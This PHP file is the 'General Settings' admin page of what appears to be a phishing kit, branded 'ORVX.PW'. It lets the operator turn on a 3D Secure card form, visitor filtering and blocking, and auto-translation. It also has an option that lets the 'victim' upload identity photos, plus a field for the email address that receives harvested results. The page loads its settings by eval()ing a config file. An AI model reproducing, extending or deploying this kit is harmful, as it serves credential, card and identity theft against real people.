<?php
require_once __DIR__ . '/../function.php';

$xconfig = false;
$actual_page = 'general';

if (file_exists($api->dir_config . '/' . $api->general_config))
{
  $xconfig = true;
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if(isset($_POST['save']))
{
	$a = $_POST['apikey'];
	$b = $_POST['3dsecure'];
	$c = $_POST['filter'];
	$d = $_POST['blocker'];
  $e = $_POST['sending'];
  $f = $_POST['translate'];
  $em = $_POST['email'];
  $photo = $_POST['identity'];
	$api->setGeneral(array($a, $b, $c, $d, $e, $f, $em, $photo));
  $api->redirect("general?success=true");
}
?>
<?php require 'page/header.php'; ?>

<body>
	<div id="main">

		<?php require 'page/sidebar.php'; ?>

		<div class="content">
			<div class="top-subhead">
				<h2>General Settings</h2>
				<div class="clear"></div>
			</div>
			<div class="full-container no-border">
				<?php
					if (isset($_GET['success']))
					{
						echo '<div class="success">Changes have been saved! ORVX.PW</div>';
					}
				?>
					<form method="post" action="" autocomplete="off">
						<ul id="settings">
							
              <li>
								<div class="left">3D Secure<span>optional for 3d secure form.</span></div>
								<div class="right">
									<select name="3dsecure">
										<?php if($xconfig == true && $config_3dsecure == 1){
											echo '<option value="1" selected>Enabled</option>
                      <option value="0">Disabled</option>';
										}
										else
										{
											echo '<option value="1">Enabled</option>
                      <option value="0" selected>Disabled</option>';
										}?>
									</select>
								</div>
							</li>
							<li>
								<div class="left">Filter<span>Block visitor if fill data with bad words.</span></div>
								<div class="right">
									<select name="filter">
										<?php if($xconfig == true && $config_filter == 1){
											echo '<option value="1" selected>Enabled</option>
                      <option value="0">Disabled</option>';
										}
										else
										{
											echo '<option value="1">Enabled</option>
                      <option value="0" selected>Disabled</option>';
										}?>
									</select>
								</div>
							</li>
							<li>
								<div class="left">Blocker<span>Block visitor if visit with blocked data.</span></div>
								<div class="right">
									<select name="blocker">
										<?php if($xconfig == true && $config_blocker == 1){
											echo '<option value="1" selected>Enabled</option>
                      <option value="0">Disabled</option>';
										}
										else
										{
											echo '<option value="1">Enabled</option>
                      <option value="0" selected>Disabled</option>';
										}?>
									</select>
								</div>
							</li>
              <li>
								<div class="left">Send<span>optional for you sending result.</span></div>
								<div class="right">
									<select name="sending">
										<?php if($xconfig == true && $config_smtp == 1){
											echo '<option value="1" selected>smtp</option>
                      <option value="0">mail</option>';
										}
										else
										{
											echo '<option value="1">smtp</option>
                      <option value="0" selected>mail</option>';
										}?>
									</select>
								</div>
							</li>
              <li>
								<div class="left">Translate<span>automatic translate text with visitor language.</span></div>
								<div class="right">
									<select name="translate">
										<?php if($xconfig == true && $config_translate == 1){
											echo '<option value="1" selected>Enabled</option>
                      <option value="0">Disabled</option>';
										}
										else
										{
											echo '<option value="1">Enabled</option>
                      <option value="0" selected>Disabled</option>';
										}?>
									</select>
								</div>
							</li> 
			<li>
								<div class="left">Identity Photo<span>allow victim to upload their identity.</span></div>
								<div class="right">
									<select name="identity">
										<?php if($xconfig == true && $config_identity == 1){
											echo '<option value="1" selected>Enabled</option>
                      <option value="0">Disabled</option>';
										}
										else
										{
											echo '<option value="1">Enabled</option>
                      <option value="0" selected>Disabled</option>';
										}?>
									</select>
								</div>
							</li>
			 <li>
								<div class="left">Email result<span>your email for sending the result.</span></div>
								<div class="right">
									<input type="text" name="email" <?php if($xconfig == true){ echo "value=\"$email_result\""; } ?> required>
								</div>
							</li>
						</ul>
						<br>
						<input type="submit" name="save" value="Save changes">
					</form>
			</div>
		</div>
		<div class="clear"></div>
	</div>

	<?php require 'page/footer.php'; ?>
</body>

</html>
